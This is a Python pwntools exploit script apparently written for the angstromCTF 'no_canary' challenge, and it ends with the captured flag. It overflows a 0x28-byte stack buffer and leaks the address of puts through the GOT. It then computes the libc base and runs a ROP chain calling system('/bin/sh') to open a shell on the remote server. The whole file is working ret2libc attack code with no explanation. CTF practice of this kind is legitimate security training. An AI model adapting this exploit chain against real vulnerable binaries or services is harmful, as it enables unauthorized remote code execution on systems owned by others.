from pwn import *


binpath = './no_canary'
elf = ELF(binpath)
# libc = elf.libc
libc = ELF('./libc6_2.23-0ubuntu10_amd64.so')

# io = process(binpath)
io = remote('shell.actf.co', 20700)


pop_rdi = 0x0000000000401343
ret = 0x000000000040101a


payload = b''
payload += b'A' * 0x28
payload += p64(pop_rdi)
payload += p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(elf.symbols['main'])

io.recvuntil(b"What's your name?")
io.sendline(payload)
io.recvuntil(b'!\n')

data = io.recvline().rstrip()
addr_puts = u64(data.ljust(8, b'\x00'))
addr_libc = addr_puts - libc.symbols['puts']
print('addr_puts = 0x{:x}'.format(addr_puts))
print('addr_libc = 0x{:x}'.format(addr_libc))


payload = b''
payload += b'B' * 0x28
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(addr_libc + next(libc.search(b'/bin/sh')))
payload += p64(addr_libc + libc.symbols['system'])

io.recvuntil(b"What's your name?")
io.sendline(payload)
io.recvuntil(b'!\n')


io.interactive()


"""
payload = b''
payload += b'B' * 0x28
payload += p64(pop_rdi)
payload += p64(elf.got['gets'])
payload += p64(elf.plt['puts'])

io.recvuntil(b"What's your name?")
io.sendline(payload)
io.recvuntil(b'!\n')

data = io.recvline().rstrip()
addr_gets = u64(data.ljust(8, b'\x00'))
print('addr_gets = 0x{:x}'.format(addr_gets))
"""


# actf{that_gosh_darn_canary_got_me_pwned!}
